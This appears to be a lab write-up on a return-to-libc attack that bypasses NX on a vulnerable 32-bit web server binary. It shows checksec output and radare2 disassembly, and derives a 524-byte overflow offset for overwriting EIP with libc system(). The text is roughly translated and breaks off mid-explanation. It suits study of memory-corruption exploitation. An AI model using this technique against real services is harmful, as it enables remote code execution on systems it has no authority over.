# Writeup - Return-to-libc - NX Bypass - lab2

This technique is useful as NX Bypass as shown below
`` `
root @ 6c712780745b: / opt # execnoaslr gdb tiny-lab2
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
...
gdb-peda $ checksec
CANARY: disabled
FORTIFY: disabled
NX: ENABLED
PIE: disabled
RELRO: Partial
`` `


## OFFSET identification
Identifying the offset of the variable in the overflowing frame was by carrying out rooting by disassembling the function identified as vulnerable by AddressSanitizer, in addition by looking disassembled it was possible to identify which was the vulnerable buffer which as seen the overflow phase is in url_decode that works on pointers of variables instantiated in process therefore overflow will be relative to the execution frame of process:
`` `
# root @ 06c96654b96d: / opt # execnoaslr radare2 tiny-lab2
[0x08048aa0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x08048aa0]> pdf @ sym.process
/ (fcn) sym.process 565
| sym.process (int arg_8h, void * arg_ch);
| ; var int var_28ch @ ebp-0x28c
| ; var int var_288h @ ebp-0x288
| ; var int var_284h @ ebp-0x284
| ; var int var_280h @ ebp-0x280
| ; var int var_27ch @ ebp-0x27c
| ; var int var_278h @ ebp-0x278
| ; var int var_274h @ ebp-0x274
| ; var char * var_270h @ ebp-0x270
| ; var char * var_26ch @ ebp-0x26c
| ; var signed int fildes @ ebp-0x268
| ; var int var_264h @ ebp-0x264
| ; var int var_260h @ ebp-0x260
| ; var int var_250h @ ebp-0x250
| ; var signed int var_234h @ ebp-0x234
| ; var char * path @ ebp-0x208 <- This is an overflow buffer identified because in the code it is used in the open ()
and for this reason it is renamed symbolically to be rooted in path
| ; var signed int var_8h_2 @ ebp-0x8
| ; var uint32_t var_4h_2 @ ebp-0x4
| ; arg int arg_8h @ ebp + 0x8
| ; arg void * arg_ch @ ebp + 0xc
| ; var void * oflag @ esp + 0x4
| ; var char * var_8h @ esp + 0x8
| ; var int var_ch @ esp + 0xc
| ; CALL XREFS from main (0x804a1df, 0x804a287)
| 0x08049d90 55 push ebp
| 0x08049d91 89e5 mov ebp, esp
`` `
From this disassembled and from the source code it has been identified that it is the `strut http_request` with the field` filename`
which is passed to open by the following code:
`File: tiny.c`
`` `
void process (int fd, struct sockaddr_in * clientaddr) {
    printf ("accept request, fd is% d, pid is% d \ n", fd, getpid ());
    http_request req;
    parse_request (fd, & req);

    struct stat sbuf;
    int status = 200, ffd = open (req.filename, O_RDONLY, 0);
    if (ffd <= 0) {
        status = 404;
        char * msg = "File not found";

[...]
`` `
Of which the relative disassembled recognizable by the `call sym.imp.open; int open (const char * path, int oflag) `
`` `
[0x08048aa0]> pdf @ sym.process
[...]
           0x08049df8 c7859cfdffff. mov dword [var_264h], 0xc8; 200
| 0x08049e02 890c24 mov dword [esp], ecx; const char * path
| 0x08049e05 c74424040000. mov dword [oflag], 0; int oflag
| 0x08049e0d c74424080000. mov dword [var_8h], 0
| 0x08049e15 89857cfdffff mov dword [var_284h], eax
| 0x08049e1b e8f0eaffff call sym.imp.open; int open (const char * path, int oflag)
| 0x08049e20 898598fdffff mov dword [fildes], eax
| 0x08049e26 83bd98fdffff. cmp dword [fildes], 0

[...]
`` `
And here in the first screen of `shave` we have that the buffer overflow is distant from the` Base Pointer: EBP` the following value: `; var char * path @ ebp-0x208` where `0x208 bytes` are based on 10` 520 bytes` and therefore on this value by adding `4 bytes` (as` 32bit`) relative to the exact value of the `EBP` as shown in the 'image:
! [Stack image] (https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/100912_1629_ReturnOrien2.png)


Consequently, the exploit injecting `" A "* 524` will include all the offset from the` Base Pointer EBP` including its `4 bytes of value` therefore, any byte written in more will overwrite the` Return Address EIP` and it will be precisely in those 4 bytes that the address calculated as a jump on function extracted from `LIBC` will be injected, in this case the` system () `function.

## Construction Idea
You can imagine the system execution as a new execution frame that contains the `RET address` as the first value to return to, which in our case will be the` 4 bytes` set to `" B "* 4` and then the parameters to be passed to
